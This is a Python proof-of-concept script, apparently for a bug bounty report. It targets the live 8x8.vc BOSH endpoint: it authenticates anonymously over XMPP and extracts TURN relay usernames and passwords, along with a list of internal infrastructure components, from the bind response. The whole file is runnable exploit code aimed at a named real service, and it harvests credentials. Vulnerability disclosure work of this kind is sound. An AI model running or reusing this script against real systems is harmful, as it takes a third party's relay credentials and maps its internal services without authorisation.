#!/usr/bin/env python3
"""
PoC: Anonymous XMPP BOSH Access + TURN Credentials Leak
Target: https://8x8.vc/http-bind (bounty-eligible: *.8x8.vc)

Requirements:
  - Python 3.6+
  - No authentication required

This PoC demonstrates:
  1. Opening an XMPP BOSH session (must share TCP connection for all requests)
  2. Authenticating as ANONYMOUS — no credentials needed
  3. Binding a resource to get a full JID
  4. Extracting TURN/STUN relay credentials leaked in the bind response
  5. Discovering 12+ internal infrastructure components

The TURN credentials are time-limited (~24h) but instantly refreshable
by opening a new anonymous session.

Usage: python3 poc_bosh_anonymous_xmpp.py
"""

import http.client
import re
import random
import sys
import json


HOST = "8x8.vc"
PATH = "/http-bind"
HEADERS = {'Content-Type': 'text/xml; charset=utf-8'}


class BOSHConnection:
    """
    BOSH (Bidirectional-streams Over Synchronous HTTP) client.
    
    NOTE: The server enforces TCP connection affinity — all requests
    for a session MUST share the same HTTPSConnection object.
    """
    
    def __init__(self):
        self.conn = http.client.HTTPSConnection(HOST, 443, timeout=15)
        self.rid = random.randint(500000000, 999999999)
        self.sid = None
        self.jid = None

    def _send(self, body_xml, is_open=False):
        self.rid += 1
        if is_open:
            xml = (
                f'<body xmlns="http://jabber.org/protocol/httpbind"'
                f' to="8x8.vc" xml:lang="en" wait="30" hold="1"'
                f' content="text/xml; charset=utf-8" ver="1.6"'
                f' xmpp:version="1.0" xmlns:xmpp="urn:xmpp:bb:0"'
                f' rid="{self.rid}"/>'
            )
        else:
            xml = (
                f'<body xmlns="http://jabber.org/protocol/httpbind"'
                f' rid="{self.rid}" sid="{self.sid}">'
                f'{body_xml}</body>'
            )
        self.conn.request("POST", PATH, body=xml.strip(), headers=HEADERS)
        resp = self.conn.getresponse()
        return resp.read().decode()

    def open(self):
        """Open a new BOSH session."""
        resp = self._send("", is_open=True)
        m = re.search(r"sid='([^']+)'", resp)
        if m:
            self.sid = m.group(1)
        return resp

    def auth_anonymous(self):
        """Authenticate as ANONYMOUS — no credentials needed."""
        return self._send(
            '<auth xmlns="urn:ietf:params:xml:ns:xmpp-sasl"'
            ' mechanism="ANONYMOUS"/>'
        )

    def bind(self, resource="poc"):
        """Bind a resource to get a JID."""
        resp = self._send(
            f'<iq type="set" id="b1">'
            f'<bind xmlns="urn:ietf:params:xml:ns:xmpp-bind">'
            f'<resource>{resource}</resource></bind></iq>'
        )
        m = re.search(r'<jid>([^<]+)</jid>', resp)
        if m:
            self.jid = m.group(1)
        return resp

    def close(self):
        """Terminate the BOSH session."""
        self.rid += 1
        try:
            self.conn.request(
                "POST", PATH,
                body=(
                    f'<body xmlns="http://jabber.org/protocol/httpbind"'
                    f' rid="{self.rid}" sid="{self.sid}" type="terminate"/>'
                ).strip(),
                headers=HEADERS
            )
        except Exception:
            pass
        self.conn.close()


def extract_services(resp):
    """Extract TURN/STUN service credentials from the bind response."""
    services = []
    for m in re.finditer(r'<service\s+([^>]+)/>', resp):
        attrs = dict(re.findall(r'(\w+)=["\']([^"\']+)["\']', m.group(1)))
        services.append(attrs)
    return services


def extract_components(resp):
    """Extract internal XMPP component identities."""
    components = []
    for m in re.finditer(
        r"<identity\s+[^>]*type='([^']+)'\s+name='([^']+)'",
        resp
    ):
        components.append({'type': m.group(1), 'name': m.group(2)})
    return components


def main():
    print("=" * 60)
    print(" 8x8.vc — Anonymous XMPP BOSH Access + TURN Leak PoC")
    print("=" * 60)
    print(f" Target: https://{HOST}{PATH}\n")

    bosh = BOSHConnection()

    # Step 1: Open session
    print("[1] Opening BOSH session...", end=" ")
    sys.stdout.flush()
    resp = bosh.open()
    print(f"SID={bosh.sid}")

    # Step 2: Anonymous auth
    print("[2] Authenticating as ANONYMOUS...", end=" ")
    sys.stdout.flush()
    resp = bosh.auth_anonymous()
    if '<success' in resp:
        print("SUCCESS (no credentials required)")
    else:
        print("FAILED")
        print(f"    Response: {resp[:200]}")
        bosh.close()
        return False

    # Step 3: Bind resource
    print("[3] Binding resource...", end=" ")
    sys.stdout.flush()
    resp = bosh.bind("poc_extract")
    if not bosh.jid:
        print("FAILED")
        bosh.close()
        return False
    print(f"JID={bosh.jid}")

    # Step 4: Extract leaked data
    print("\n[4] Extracting leaked TURN credentials...")
    services = extract_services(resp)
    if services:
        print(f"    Found {len(services)} services:")
        for s in services:
            svc_type = s.get('type', '?')
            host = s.get('host', '?')
            port = s.get('port', '?')
            if svc_type in ('turn', 'turns'):
                username = s.get('username', '?')
                password = s.get('password', '?')
                expires = s.get('expires', '?')
                transport = s.get('transport', '?')
                print(f"    TURN ({transport}):")
                print(f"      Host:     {host}:{port}")
                print(f"      Username: {username}")
                print(f"      Password: {password}")
                print(f"      Expires:  {expires}")
            else:
                print(f"    STUN: {host}:{port}")

    print("\n[5] Extracting internal component list...")
    components = extract_components(resp)
    if components:
        print(f"    Found {len(components)} components/services:")
        for c in components:
            print(f"      - {c['name']} ({c['type']})")

    # Print full bind response for evidence
    print(f"\n[6] Raw bind response ({len(resp)} bytes):")
    print("    " + resp[:500].replace('\n', '\n    '))
    print("    ... (truncated)")

    # Clean up
    bosh.close()
    print("\n" + "=" * 60)
    print(" PoC completed successfully")
    print("=" * 60)
    return True


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
